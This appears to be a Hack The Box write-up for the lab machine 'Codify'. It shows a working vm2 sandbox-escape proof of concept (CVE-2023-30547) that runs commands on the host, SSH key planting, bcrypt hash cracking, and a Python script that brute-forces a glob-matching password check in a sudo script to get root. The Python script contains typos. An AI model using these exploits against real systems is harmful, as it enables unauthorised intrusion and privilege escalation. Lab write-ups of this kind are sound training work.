

# Codify


<p align="center">
  <img src="https://github.com/MrGovindDubey/HTB-Machines/assets/118271775/0897cb09-50b3-430b-9376-58dfe79b24c1" />
</p>


"WebSandbox Escape Challenge," a sophisticated Linux Operating System test bed meticulously crafted to evaluate your proficiency in navigating a web application vulnerability, culminating in a comprehensive system takeover.
Engage in this immersive experience where participants find themselves confined within a virtual web sandbox. Your mission, should you choose to accept it, is to navigate intricate layers, decipher concealed keys, hijack scripts, and ultimately secure root access. This challenge serves as a definitive masterclass, refining your skills in circumventing constraints, exploiting guarded secrets, and wielding authoritative power within a simulated environment.
Beyond traditional cybersecurity exercises, this repository offers a dynamic and intellectually stimulating experience, pushing the boundaries of your ingenuity and strategic thinking. "WebSandbox Escape Challenge" is not merely a code repository; it represents a gateway for honing your cybersecurity skills and mastering the intricate craft.
Are you prepared to break free, unleash your potential, and emerge victorious in this stimulating adventure? The challenge beckons – let the hacking games commence!

__Keywords:
node.js, vm2, python exploit scripting__


## Updating the Hosts Configuration with the Target:

To direct traffic towards the target, codify.htb, it is necessary to append its information to the __"/etc/hosts file"__. Ensure the target's details are accurately encoded in the hosts file and then save the changes to facilitate seamless interaction.

```bash

echo "10.10.14.239 codify.htb" | sudo tee -a /etc/hosts

```


## Enumeration: revealing the target's landscape.

Starting a Nmap scan is the critical first step in comprehending the complexities of the target environment. By painstakingly probing the target, the attacker acquires crucial knowledge, allowing for a more focused and educated investigation. This enumeration procedure establishes the groundwork for finding possible vulnerabilities, paving the way for the next stages of the penetration testing journey.

```bash
nmap -sC -sV -v -oN nmap.log 10.10.11.239
```

```bash

Nmap scan report for codify.htb (10.10.11.239)
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /opt/homebrew/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```


Port Analysis: Introducing Services on the Target System

- Port 22 shows an active OpenSSH 8.9p1 service, indicating that SSH is available for remote access. The use of a latest version indicates a lower chance of vulnerabilities.

- An Apache 2.4.52 web server is exposed on port 80. A thorough check with the http-methods probe reveals support for popular methods like GET, HEAD, and POST. This implies the presence of a web application, prompting additional investigation.

- Intriguingly, port 3000 reveals a live Node.js Express framework service. Given the typical susceptibility of Node.js apps to code and dependency vulnerabilities, this revelation offers up possibilities for further investigation and potential exploitation.


## Exploration of Codify's Environment -

Commencing the towards an initial foothold, I directed my attention to codify.htb, leveraging the capabilities of Burp Suite for traffic interception. A systematic exploration of the web application unveiled three primary pages:

-  About Us: This section provided a comprehensive overview, revealing Codify as a Node.js sandbox environment utilizing the vm2 library to securely execute untrusted code.

-  Editor: A straightforward page with a textarea interface enabled users to input Node.js code for execution.

-  Limitations: Highlighting operational constraints, this page documented restricted access to specific modules such as child_process and fs.

The "About Us" page disclosed that while Codify excelled in sandboxing code execution, it wasn't impervious to vulnerabilities.

Conducting an in-depth inquiry into the vm2 library, I uncovered a recently disclosed Sandbox Escape vulnerability, identified as   ___CVE-2023-30547___.  This newfound knowledge hinted at a potential avenue to exploit and surpass the sandbox limitations.

To validate this discovery, I implemented a Proof of Concept (PoC) exploit code within the textarea. This exploit manipulated Proxy and Error objects, enabling unauthorized access to the main process and execution of arbitrary commands, effectively demonstrating the practical exploitation of the identified vulnerability.


```bash

const {VM} = require("vm2");
const vm = new VM();

const code = `
cmd = 'id'
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync(cmd);
}
`
console.log(vm.run(code));

```

Having successfully executed the exploit, I utilized this newfound capability to run commands on the underlying system. By adding my SSH public key to the ~/.ssh/authorized_keys file, I established a secure and persistent connection. Exploiting this access, I gained shell access as the current user, identified as "svc," marking a significant advancement in the penetration process. This achievement set the stage for continued exploration and manipulation within the system.

![codify pawnd by Mr Govind Dubey](https://github.com/MrGovindDubey/HTB-Machines/assets/118271775/a396cc30-69fc-4585-bc1d-45380d604c01)

The vulnerable vm2 version along with sandbox escape primitives were key to gaining an initial foothold on the Codify server.

I SSH'd into the server as user svc:

```bash
ssh svc@codify.htb -i id_rsa
```

## Escalating Privileges to "Joshua" 

Following the successful acquisition of initial access as the "svc" user on the Codify server, my focus shifted towards identifying pathways for privilege escalation. My goal was to secure access to the "joshua" user account, a presence I had detected during the enumeration phase of the server. This phase involved a meticulous exploration aimed at uncovering potential vulnerabilities and avenues for advancing privileges within the system.

### Discovering the tickets.db File
I started by thoroughly enumerating the file system. Buried within the web directory at /var/www/contact I noticed an interesting file named tickets.db.

Examining it revealed it was a SQLite database file owned by the svc user I was currently running as:

```bash

svc@codify:/var/www/contact$ ls -la tickets.db
-rw-r--r-- 1 svc svc 20480 Sep 12 17:45 tickets.db

```

### Extracting Credentials with strings
My next step was to extract any readable strings from the binary SQLite file using the strings utility:

```bash

svc@codify:/var/www/contact$ strings tickets.db

SQLite format 3
tabletickets
...
CREATE TABLE users ( 
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE, 
        password TEXT
    )
...
joshua
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```
This revealed a bcrypt password hash for the user joshua.


### Decrypting the Hash with John the Ripper

Armed with a password hash, my next objective was to decipher it using John the Ripper. The initial step involved saving the hash to a designated file:

```bash
echo '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' > hash.txt
```


Continuing the decryption process, I invoked John the Ripper, specifying the bcrypt format, and employed the rockyou wordlist:

```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### User Switching via su

Having obtained Joshua's credentials, I seamlessly switched users and elevated privileges using the su command:


```bash
┌─[linux-htb@parrot]─[~]
└──╼ $ssh joshua@codify.htb
The authenticity of host 'codify.htb (10.10.11.239)' can't be established.
ECDSA key fingerprint is SHA256:uw/jWXjXA/tl23kwRKzW+MkhMkNAVc1Kwwlm8EnJrqI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'codify.htb,10.10.11.239' (ECDSA) to the list of known hosts.
joshua@codify.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan 29 05:15:06 PM UTC 2024

  System load:                      0.03271484375
  Usage of /:                       64.4% of 6.50GB
  Memory usage:                     30%
  Swap usage:                       0%
  Processes:                        280
  Users logged in:                  1
  IPv4 address for br-030a38808dbf: 172.18.0.1
  IPv4 address for br-5ab86a4e40d0: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.239


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
```


## Reading the User Flag
Finally, as the joshua user I could read the protected user flag in /home/joshua/user.txt:


```bash

Last login: Mon Jan 29 16:42:57 2024 from 10.10.15.0
joshua@codify:~$ ls
lol.py  pattern.py  user.txt
joshua@codify:~$ cat user.txt 
a2c643332c56aa463f9df3cfd94da300

```

]

The entire process of privilege escalation facilitated a seamless transition from my initial restricted access as "svc" to attaining full access under the "joshua" account, ultimately leading to the successful capture of the flag.

## Root-Level Privilege Escalation

Following the transition to the "joshua" user, my exploration persisted as I actively sought additional opportunities for privilege escalation. This quest aimed to further elevate access within the system.

The most challenging phase for me was when I had to temporarily step away from my computer and return the next day with a refreshed mindset.

Initially, I employed the LinEnum script to obtain a broad understanding and subsequently applied appropriate tactics to attain root access. However, I encountered a misleading outcome as the script returned a docker container launched as root. This led me to invest time in searching for privilege escalation tactics within the docker container. It was only later that I realized neither the user "joshua" nor the user "svc" belonged to a docker group, prompting me to abandon this approach.

```bash
joshua@codify:/opt/scripts$ sudo -l

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

### Reviewing /opt/scripts/mysql-backup.sh

```bash

#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'

```

The vulnerability in the script stems from the way it manages password confirmation:

```bash
if [[ $DB_PASS == $USER_PASS ]]; then
    /usr/bin/echo "Password confirmed!"
else
    /usr/bin/echo "Password confirmation failed!"
    exit 1
fi
```

The vulnerability in this script lies in the comparison between the user-provided password (USER_PASS) and the actual database password (DB_PASS). The issue arises from the use of == inside [[ ]] in Bash, which performs pattern matching instead of a direct string comparison. Consequently, the user input (USER_PASS) is treated as a pattern, and if it contains glob characters like * or ?, it may unintentionally match with other strings.

For instance, if the actual password (DB_PASS) is "password123," and the user enters * as their password (USER_PASS), the pattern match would succeed because * matches any string. This could potentially lead to unauthorized access.

Exploiting this vulnerability, an attacker could employ a brute-force attack to try every character in the DB_PASS until a match is found.

## Exploiting the Pattern Matching Vulnerability:

I crafted a Python script to take advantage of this weakness by systematically testing password prefixes and suffixes, gradually unveiling the complete password.

The script incrementally constructs the password character by character, validating each guess by executing the script through sudo and verifying the success of each attempt.

```bash

import string
import subproccess

def check_password(p):
	command = f"echo '{p}*' | sudo /opt/scripts/mysql-backup.sh"
	result = subprocess.run(command, shell=True, stdout=subproccess.PIPE, stderr=subproccess.PIPE, text=True)
	return "Password confirmed!" in result.stdout

charset = string.ascii_letters + string.digits
password = ""
is_password_found = False

while not is_password_found:
	for char in charset:
		if check_password(password + char)
			password += char
			print(password)
			break
	else:
		is_password_found = True

```


https://github.com/MrGovindDubey/HTB-Machines/assets/118271775/6651cd98-3a1a-4501-a457-39bbd31ac187

__Great! we got the root password. Let’s escalate our privilege. Finally I got the root flag.__

## Gaining Root Shell Using su:

Having obtained the backup password, I successfully utilized su to transition to the root user. 

```bash

joshua@codify:/tmp$ su root
Password:
root@codify:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@codify:/tmp# ls -la ~
total 40
drwx------  5 root root 4096 Sep 26 09:35 .
drwxr-xr-x 18 root root 4096 Oct 31 07:57 ..
lrwxrwxrwx  1 root root    9 Sep 14 03:26 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
-rw-r--r--  1 root root   22 May  8  2023 .creds
drwxr-xr-x  3 root root 4096 Sep 26 09:35 .local
lrwxrwxrwx  1 root root    9 Sep 14 03:34 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Nov 14 07:14 root.txt
drwxr-xr-x  4 root root 4096 Sep 12 16:56 scripts
drwx------  2 root root 4096 Sep 14 03:31 .ssh
-rw-r--r--  1 root root   39 Sep 14 03:26 .vimrc
root@codify:/tmp# cat ~/root.txt
8070f26ea2ef1c9c874c60f03051689c

```






